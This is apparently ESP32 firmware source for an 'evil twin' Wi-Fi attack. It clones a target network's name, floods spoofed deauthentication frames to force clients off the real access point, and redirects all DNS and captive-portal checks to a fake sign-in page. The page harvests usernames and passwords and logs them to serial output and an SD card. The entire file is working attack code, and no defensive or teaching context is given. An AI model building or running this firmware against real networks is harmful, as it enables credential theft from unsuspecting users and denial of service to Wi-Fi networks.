/*
 * This firmware is under MIT License
 * Author: Abdullah Ali
 */
#include "eviltwin.h"
#include "sdcard.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"

bool eviltwinRunning = false;
int eviltwinClients = 0;
int eviltwinCaptured = 0;
char eviltwinLastUser[64] = {0};
char eviltwinLastPass[64] = {0};
uint32_t eviltwinDeauthPkts = 0;

static char etSSID[MAX_SSID_LEN];
static DNSServer* dnsServer = nullptr;
static WebServer* webServer = nullptr;

static const IPAddress apIP(192, 168, 4, 1);
static const IPAddress subnet(255, 255, 255, 0);

static uint8_t realAPBSSID[6];
static uint8_t realAPChannel = 0;
static uint8_t etAPChannel = 0;
static const int DEAUTH_BURST_COUNT = 10;

static uint8_t etDeauthFrame[26] = {
  0xC0, 0x00,
  0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

static String buildPortalPage() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to )rawliteral";
  page += String(etSSID);
  page += R"rawliteral(</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;
min-height:100vh}
.card{background:#16213e;border-radius:16px;padding:32px;width:90%;max-width:380px;
box-shadow:0 8px 32px rgba(0,0,0,.4)}
h2{text-align:center;margin-bottom:8px;font-size:20px;color:#e94560}
.sub{text-align:center;color:#888;font-size:13px;margin-bottom:24px}
label{display:block;font-size:13px;color:#aaa;margin-bottom:6px}
input[type=text],input[type=password]{width:100%;padding:12px;border:1px solid #333;
border-radius:8px;background:#0f3460;color:#fff;font-size:15px;margin-bottom:16px;
outline:none}
input:focus{border-color:#e94560}
button{width:100%;padding:14px;background:#e94560;color:#fff;border:none;
border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#c73750}
.footer{text-align:center;margin-top:16px;font-size:11px;color:#555}
</style>
</head>
<body>
<div class="card">
<h2>)rawliteral";
  page += String(etSSID);
  page += R"rawliteral(</h2>
<p class="sub">Enter your WiFi password to connect</p>
<form method="POST" action="/login">
<label>Email or Username</label>
<input type="text" name="user" placeholder="user@example.com">
<label>Password</label>
<input type="password" name="pass" placeholder="Enter password">
<button type="submit">Sign In</button>
</form>
<p class="footer">Secured connection &bull; Terms of Service apply</p>
</div>
</body>
</html>
)rawliteral";
  return page;
}

static String buildSuccessPage() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;
min-height:100vh}
.card{background:#16213e;border-radius:16px;padding:32px;width:90%;max-width:380px;
text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.4)}
h2{color:#4ecca3;margin-bottom:12px}
p{color:#aaa;font-size:14px}
</style>
</head>
<body>
<div class="card">
<h2>&#10003; Connected</h2>
<p>You are now connected to the network. You may close this page.</p>
</div>
</body>
</html>
)rawliteral";
  return page;
}

static void handleRoot() {
  webServer->send(200, "text/html", buildPortalPage());
}

static void handleLogin() {
  String user = webServer->arg("user");
  String pass = webServer->arg("pass");

  Serial.printf("[EVILTWIN] Captured: user=%s pass=%s\n", user.c_str(), pass.c_str());

  strncpy(eviltwinLastUser, user.c_str(), 63);
  eviltwinLastUser[63] = '\0';
  strncpy(eviltwinLastPass, pass.c_str(), 63);
  eviltwinLastPass[63] = '\0';

  String logEntry = sdcard_getTimestamp() + " SSID=" + String(etSSID) +
                    " USER=" + user + " PASS=" + pass;
  sdcard_appendLog(EVILTWIN_LOG, logEntry);

  eviltwinCaptured++;

  webServer->send(200, "text/html", buildSuccessPage());
}

static void handleNotFound() {
  webServer->sendHeader("Location", String("http://") + apIP.toString(), true);
  webServer->send(302, "text/plain", "");
}

static void handleGenerate204() {
  webServer->sendHeader("Location", String("http://") + apIP.toString(), true);
  webServer->send(302, "text/plain", "");
}

static void handleHotspotDetect() {
  webServer->sendHeader("Location", String("http://") + apIP.toString(), true);
  webServer->send(302, "text/html", "");
}

static void sendDeauthBurst() {
  for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, etDeauthFrame, 26, false);
    eviltwinDeauthPkts++;
  }
}

void eviltwin_start(const char* ssid, uint8_t apChannel, const uint8_t* realBSSID, uint8_t realCh) {
  strncpy(etSSID, ssid, MAX_SSID_LEN - 1);
  etSSID[MAX_SSID_LEN - 1] = '\0';

  eviltwinClients = 0;
  eviltwinCaptured = 0;
  eviltwinLastUser[0] = '\0';
  eviltwinLastPass[0] = '\0';
  eviltwinDeauthPkts = 0;

  memcpy(realAPBSSID, realBSSID, 6);
  realAPChannel = realCh;
  etAPChannel = apChannel;

  // Frame offset 10 (Source) and 16 (BSSID) patched with target AP MAC
  memcpy(&etDeauthFrame[10], realAPBSSID, 6);
  memcpy(&etDeauthFrame[16], realAPBSSID, 6);

  // Host clone AP on target channel so victims associate immediately
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP(etSSID, NULL, realCh);
  etAPChannel = realCh;

  Serial.printf("[EVILTWIN] AP started: SSID=%s ch=%d\n", etSSID, realCh);

  dnsServer = new DNSServer();
  dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer->start(53, "*", apIP);

  webServer = new WebServer(80);
  webServer->on("/", HTTP_GET, handleRoot);
  webServer->on("/login", HTTP_POST, handleLogin);
  webServer->on("/generate_204", handleGenerate204);
  webServer->on("/gen_204", handleGenerate204);
  webServer->on("/hotspot-detect.html", handleHotspotDetect);
  webServer->on("/connecttest.txt", handleGenerate204);
  webServer->on("/ncsi.txt", handleGenerate204);
  webServer->on("/fwlink", handleGenerate204);
  webServer->onNotFound(handleNotFound);
  webServer->begin();

  sdcard_appendLog(EVILTWIN_LOG, sdcard_getTimestamp() + " EVILTWIN_START ssid=" + String(etSSID));
  eviltwinRunning = true;
}

void eviltwin_stop() {
  eviltwinRunning = false;

  if (webServer) {
    webServer->stop();
    delete webServer;
    webServer = nullptr;
  }
  if (dnsServer) {
    dnsServer->stop();
    delete dnsServer;
    dnsServer = nullptr;
  }

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);

  sdcard_appendLog(EVILTWIN_LOG, sdcard_getTimestamp() + " EVILTWIN_STOP captured=" + String(eviltwinCaptured));
  Serial.printf("[EVILTWIN] Stopped. Captured: %d, Deauth pkts: %u\n",
                eviltwinCaptured, eviltwinDeauthPkts);
}

void eviltwin_loop() {
  if (!eviltwinRunning) return;

  if (dnsServer) dnsServer->processNextRequest();
  if (webServer) webServer->handleClient();

  eviltwinClients = WiFi.softAPgetStationNum();

  sendDeauthBurst();
}

const char* eviltwin_getSSID() {
  return etSSID;
}
